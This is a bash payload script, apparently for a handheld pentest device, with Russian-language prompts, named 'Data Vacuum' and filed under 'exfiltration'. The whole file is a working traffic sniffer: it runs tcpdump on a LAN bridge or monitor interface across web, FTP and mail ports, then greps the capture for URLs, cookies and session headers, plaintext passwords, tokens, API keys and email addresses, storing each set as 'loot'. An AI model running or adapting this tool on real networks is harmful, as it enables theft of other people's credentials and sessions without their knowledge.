#!/bin/bash
# Title: Вакуум Данных
# Author: NullSec
# Description: Захватывает и извлекает интересные данные из сетевого трафика
# Category: nullsec/exfiltration

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/datavacuum"
mkdir -p "$LOOT_DIR"

PROMPT "ВАКУУМ ДАННЫХ

Всасывает интересные данные
из сетевого трафика в
реальном времени.

Извлекает:
- Посещенные URL
- Куки и сессии
- Учетные данные (в открытом виде)
- Адреса электронной почты
- Данные форм POST

Нажмите OK для настройки."

# Find capture interface
IFACE=""
for i in br-lan wlan1mon eth0 $IFACE; do
    [ -d "/sys/class/net/$i" ] && IFACE="$i" && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "Нет интерфейса захвата!

Убедитесь, что br-lan или wlan1mon
доступны."; exit 1; }

LOG "Интерфейс захвата: $IFACE"

PROMPT "РЕЖИМ ИЗВЛЕЧЕНИЯ:

1. Только URL
2. Куки и сессии
3. Учетные данные (в открытом виде)
4. Адреса электронной почты
5. Все (полный вакуум)

Интерфейс: $IFACE
Выберите режим далее."

MODE=$(NUMBER_PICKER "Режим (1-5):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=5 ;; esac
[ "$MODE" -lt 1 ] && MODE=1
[ "$MODE" -gt 5 ] && MODE=5

DURATION=$(NUMBER_PICKER "Длительность (минуты):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac
[ "$DURATION" -lt 1 ] && DURATION=1
[ "$DURATION" -gt 720 ] && DURATION=720

DURATION_S=$((DURATION * 60))

MAX_SIZE=$(NUMBER_PICKER "Макс добыча МБ:" 50)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_SIZE=50 ;; esac
[ "$MAX_SIZE" -lt 1 ] && MAX_SIZE=1
[ "$MAX_SIZE" -gt 500 ] && MAX_SIZE=500

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ВАКУУМ?

Интерфейс: $IFACE
Режим: $MODE
Длительность: ${DURATION}м
Макс размер: ${MAX_SIZE}МБ

Нажмите OK для начала.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION_DIR="$LOOT_DIR/session_$TIMESTAMP"
mkdir -p "$SESSION_DIR"
URL_LOG="$SESSION_DIR/urls.txt"
COOKIE_LOG="$SESSION_DIR/cookies.txt"
CRED_LOG="$SESSION_DIR/credentials.txt"
EMAIL_LOG="$SESSION_DIR/emails.txt"
RAW_LOG="$SESSION_DIR/raw_data.txt"

LOG "Вакуум данных запущен - Режим $MODE"
SPINNER_START "Всасывание трафика..."

# Build grep patterns per mode
extract_urls() {
    grep -oiE 'https?://[a-zA-Z0-9./?=_%&:#@!~\-]+' >> "$URL_LOG"
}
extract_cookies() {
    grep -iE 'cookie:|set-cookie:' >> "$COOKIE_LOG"
}
extract_creds() {
    grep -iE 'user(name)?=|pass(word)?=|login=|email=|auth|token=|api[_-]?key' >> "$CRED_LOG"
}
extract_emails() {
    grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' >> "$EMAIL_LOG"
}

# Capture and pipe through extraction
PCAP_TMP="$SESSION_DIR/capture.pcap"
timeout "$DURATION_S" tcpdump -i "$IFACE" -A -s 0 -c 100000 \
    'tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 21 or tcp port 25 or tcp port 110' \
    -w "$PCAP_TMP" 2>/dev/null &
TCPDUMP_PID=$!

# Monitor size limit in background
(
    while kill -0 "$TCPDUMP_PID" 2>/dev/null; do
        CURRENT_SIZE=$(du -sm "$SESSION_DIR" 2>/dev/null | awk '{print $1}')
        if [ "${CURRENT_SIZE:-0}" -ge "$MAX_SIZE" ]; then
            kill "$TCPDUMP_PID" 2>/dev/null
            break
        fi
        sleep 5
    done
) &
MONITOR_PID=$!

wait "$TCPDUMP_PID" 2>/dev/null
kill "$MONITOR_PID" 2>/dev/null

SPINNER_STOP

# Post-process pcap
if [ -f "$PCAP_TMP" ]; then
    SPINNER_START "Извлечение данных..."

    PCAP_TEXT="$SESSION_DIR/pcap_ascii.txt"
    tcpdump -A -r "$PCAP_TMP" 2>/dev/null > "$PCAP_TEXT"

    case $MODE in
        1) cat "$PCAP_TEXT" | extract_urls ;;
        2) cat "$PCAP_TEXT" | extract_cookies ;;
        3) cat "$PCAP_TEXT" | extract_creds ;;
        4) cat "$PCAP_TEXT" | extract_emails ;;
        5)
            cat "$PCAP_TEXT" | extract_urls
            cat "$PCAP_TEXT" | extract_cookies
            cat "$PCAP_TEXT" | extract_creds
            cat "$PCAP_TEXT" | extract_emails
            ;;
    esac

    # Deduplicate
    for f in "$URL_LOG" "$COOKIE_LOG" "$CRED_LOG" "$EMAIL_LOG"; do
        [ -f "$f" ] && sort -u "$f" -o "$f"
    done

    rm -f "$PCAP_TEXT"
    SPINNER_STOP
fi

# Summary
URL_C=0; COOKIE_C=0; CRED_C=0; EMAIL_C=0
[ -f "$URL_LOG" ] && URL_C=$(wc -l < "$URL_LOG" | tr -d ' ')
[ -f "$COOKIE_LOG" ] && COOKIE_C=$(wc -l < "$COOKIE_LOG" | tr -d ' ')
[ -f "$CRED_LOG" ] && CRED_C=$(wc -l < "$CRED_LOG" | tr -d ' ')
[ -f "$EMAIL_LOG" ] && EMAIL_C=$(wc -l < "$EMAIL_LOG" | tr -d ' ')
TOTAL=$((URL_C + COOKIE_C + CRED_C + EMAIL_C))
LOOT_SIZE=$(du -sh "$SESSION_DIR" 2>/dev/null | awk '{print $1}')

LOG "Вакуум завершен: извлечено $TOTAL элементов"

PROMPT "ВАКУУМ ЗАВЕРШЕН

URL:         $URL_C
Куки:        $COOKIE_C
Учетные данные: $CRED_C
Электронные письма: $EMAIL_C
Всего:       $TOTAL элементов
Размер:      $LOOT_SIZE

Добыча: $SESSION_DIR"
